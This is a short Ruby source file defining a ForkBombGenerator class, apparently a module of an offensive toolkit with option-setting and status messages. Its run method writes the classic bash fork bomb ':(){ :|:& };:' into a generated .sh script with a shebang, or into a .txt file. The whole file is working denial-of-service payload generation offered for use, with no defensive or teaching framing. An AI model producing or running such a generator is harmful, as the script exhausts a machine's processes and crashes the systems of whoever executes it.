class ForkBombGenerator
  def initialize(file_name = "forkbomb", format = "sh")
    @file_name = file_name
    @format = format
    ensure_generated_folder
  end

  def ensure_generated_folder
    Dir.mkdir("generated") unless Dir.exist?("generated")
  end

  def run
    file_path = "generated/#{@file_name}.#{@format}"
    payload_content = case @format.downcase
                      when "sh"
                        "#!/bin/bash\n:(){ :|:& };:"
                      when "txt"
                        "Fork Bomb: :(){ :|:& };:"
                      else
                        puts "[-] Unsupported format!"
                        return
                      end
    File.write(file_path, payload_content)
    puts "[+] Fork Bomb saved as #{file_path}"
  end

  def set_option(option, value)
    case option.downcase
    when "file_name"
      @file_name = value
    when "format"
      @format = value.downcase == "sh" ? "sh" : "txt"
    else
      puts "[-] Unknown option: #{option}"
    end
  end

  def show_options
    puts "File Name: #{@file_name}"
    puts "Format: #{@format} (txt/sh)"
  end
end